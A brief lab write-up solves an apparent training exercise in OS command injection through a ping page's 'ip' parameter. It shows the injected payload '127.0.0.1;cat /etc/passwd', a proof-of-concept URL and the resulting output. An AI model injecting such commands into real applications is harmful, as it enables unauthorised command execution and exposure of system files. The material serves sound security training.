## Solution
1. Visiting the website, we can a result of `ping` commnad displayed.
2. On viewing the URL, we can see an `ip` parameter, which has a IP address (or value) `127.0.0.1`
3. We can add `;` to concatenate the value of the parameter and add `cat /etc/passwd`
4. So the command would be:
```
ip=127.0.0.1;cat /etc/passwd
```
5. And we can see the results being printed on the page.
6. Replacing the `cat /etc/passwd` with `/usr/bin/score [UUID]` command, we can complete the exercise.


## POC
URL: http://[REDACTED].libcurl.so/?ip=127.0.0.1;/usr/local/bin/score%20[REDACTED]

```
$ ping -c 2 127.0.0.1;/usr/local/bin/score [UUID]    PING 127.0.0.1 (127.0.0.1): 56 data bytes
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.113 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.112 ms
--- 127.0.0.1 ping statistics ---
2 packets transmitted, 2 packets received, 0% packet loss
round-trip min/avg/max/stddev = 0.112/0.113/0.113/0.000 ms
Exercise completed!!
